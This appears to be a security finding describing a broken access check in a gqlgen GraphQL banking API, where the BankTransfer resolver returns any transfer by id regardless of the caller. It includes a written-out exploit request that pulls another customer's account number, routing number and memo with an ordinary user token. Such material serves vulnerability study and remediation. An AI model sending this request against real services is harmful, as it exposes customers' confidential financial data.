diagnosis: The gqlgen BankTransfer query resolver retrieves financial transfer records solely based on the GraphQL id argument. The resolver ignores caller identity in context.Context, allowing any authenticated user to query confidential wire transfer details, destination bank accounts, routing numbers, and memo fields belonging to other customers.
exploit_request:
POST /graphql HTTP/1.1
Host: api.online-banking.com
Authorization: Bearer customer_user_token_12
Content-Type: application/json

{"query": "query { bankTransfer(id: \"tx_8831920\") { id amount destinationAccount routingNumber memo } }"}
